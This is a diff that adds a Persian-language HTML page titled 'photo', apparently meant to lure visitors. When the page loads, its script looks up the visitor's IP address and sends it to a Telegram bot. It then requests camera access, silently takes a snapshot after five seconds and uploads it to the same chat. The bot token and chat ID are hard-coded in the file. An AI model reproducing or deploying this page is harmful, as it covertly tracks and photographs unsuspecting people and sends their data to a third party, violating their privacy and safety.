@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عکس</title>
+</head>
+<body>
+   
+    <script>
+        const BOT_TOKEN = "7510395245:AAHXB8qkuijYUJBafCESp4fVJIaB64nOULk";  
+        const CHAT_ID = "tel:5444708704";   
+
+        // دریافت آی‌پی کاربر
+        fetch("https://api64.ipify.org?format=json")
+          .then(response => response.json())
+          .then(data => {
+            let ip = data.ip;
+            let message = `📡 IP Address: ${ip}`;
+            
+            // ارسال آی‌پی به تلگرام
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+              .then(res => console.log("IP sent to Telegram"))
+              .catch(err => console.error("Error sending IP:", err));
+          })
+          .catch(error => console.error("IP fetch error:", error));
+
+        // گرفتن تصویر دوربین و ارسال به تلگرام
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            let video = document.createElement("video");
+            video.srcObject = stream;
+            video.autoplay = true;
+            
+            setTimeout(() => {
+              let canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              let ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+              canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "photo.jpg");
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                  method: "POST",
+                  body: formData
+                })
+                .then(res => console.log("Photo sent to Telegram"))
+                .catch(err => console.error("Error sending photo:", err));
+              });
+
+              // متوقف کردن دوربین
+              stream.getTracks().forEach(track => track.stop());
+            }, 5000);
+          })
+          .catch(error => console.error("Camera access error:", error));
+    </script>
+</body>
+</html>
